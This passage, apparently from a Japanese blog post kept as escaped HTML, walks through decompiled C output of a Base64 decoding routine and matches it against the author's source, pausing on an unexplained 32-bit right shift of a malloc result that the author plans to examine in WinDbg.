    sVar2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;_strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    uVar4 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;thunk_FUN_0041973b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sVar2 &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ulonglong&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;uVar4 &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    pbVar3 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;uVar4&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pbVar3 &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;_memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_88&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_90 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;local_90 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_90 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_90 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        local_88&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;in_stack_ffffff50&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;local_90&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x7f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;local_90&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
      local_90 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      local_98 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; pbVar3&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;local_90 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;sVar2 &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;local_90&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; local_ac&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        bVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_88&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;param_1&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;local_90&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x7f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;bVar1 &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x80U&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_98 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;bVar1 &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3fU&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_98 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_94 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;bVar1 &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3U&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_94 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;bVar1 &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xfU&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_98 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_94 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;bVar1 &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xfU&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_94 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;bVar1 &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3U&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_94 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; bVar1 &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_94 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        local_90 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_90 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        local_98 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_90 &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x80000003&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;local_98 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
          local_98 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_98 &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xfffffffc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;param_2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;local_94 &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;pbVar3&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;thunk_FUN_00407ca8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_8 &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffffc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;local_94&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;in_stack_ffffff50&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これと言って特筆する点はないですが、一か所読んでもよくわからないデコンパイル結果がありました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;sVar2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;_strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
uVar4 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;thunk_FUN_0041973b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sVar2 &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ulonglong&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;uVar4 &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
pbVar3 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;uVar4&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ソースコードでいうと以下のコードの箇所です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// デコードするBase64文字列用のメモリ領域の確保&lt;/span&gt;
length &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;length &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;thunk_FUN_0041973b&lt;/code&gt;が&lt;code class=&quot;language-text&quot;&gt;malloc&lt;/code&gt;なので、&lt;code class=&quot;language-text&quot;&gt;uVar4 = thunk_FUN_0041973b((sVar2 * 3 &gt;&gt; 2) + 3);&lt;/code&gt;の&lt;code class=&quot;language-text&quot;&gt;uVar4&lt;/code&gt;はソースコードでいうところの&lt;code class=&quot;language-text&quot;&gt;data&lt;/code&gt;であることがわかります。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;malloc&lt;/code&gt;関数は成功したときに確保したメモリ領域の先頭アドレスを戻り値に格納するため、&lt;code class=&quot;language-text&quot;&gt;uVar4&lt;/code&gt;にはアドレスが格納されています。&lt;/p&gt;
&lt;p&gt;これを&lt;code class=&quot;language-text&quot;&gt;0x20&lt;/code&gt;分右シフトしているので、やっていることとしてはアドレスを32bit分ずらしている処理であると思います。&lt;/p&gt;
&lt;p&gt;この動きの理由はデコンパイル結果からは理解が及ばなかったので、この後WinDbgで解析を行う際に確認したいと思います。&lt;/p&gt;
